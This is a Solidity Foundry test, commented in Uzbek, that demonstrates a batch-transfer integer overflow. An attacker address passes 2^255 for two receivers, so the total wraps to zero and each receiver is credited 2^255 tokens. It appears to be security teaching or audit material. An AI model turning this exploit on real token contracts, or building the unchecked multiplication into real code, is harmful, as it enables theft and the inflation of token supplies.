// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/BatchTokenTransfer.sol";

contract BatchOverflowTest is Test {
    BatchTokenTransfer token;
    address attacker = address(0x9999);
    address receiver2 = address(0x8888);

    function setUp() public {
        token = new BatchTokenTransfer(1_000_000);
    }

    function testBatchOverflowMint() public {
        // Attacker balansida 0 token bor
        assertEq(token.balances(attacker), 0);

        // 2^255 qiymati
        uint256 overflowVal = 1 << 255;
        address[] memory receivers = new address[](2);
        receivers[0] = attacker;
        receivers[1] = receiver2;

        // 2 * 2^255 = 2^256 = 0 (OVERFLOW!)
        vm.prank(attacker);
        bool success = token.batchTransfer(receivers, overflowVal);
        assertTrue(success);

        // Hujumchi hisobiga 2^255 token qo'shildi
        assertEq(token.balances(attacker), overflowVal);
        assertEq(token.balances(receiver2), overflowVal);
    }
}
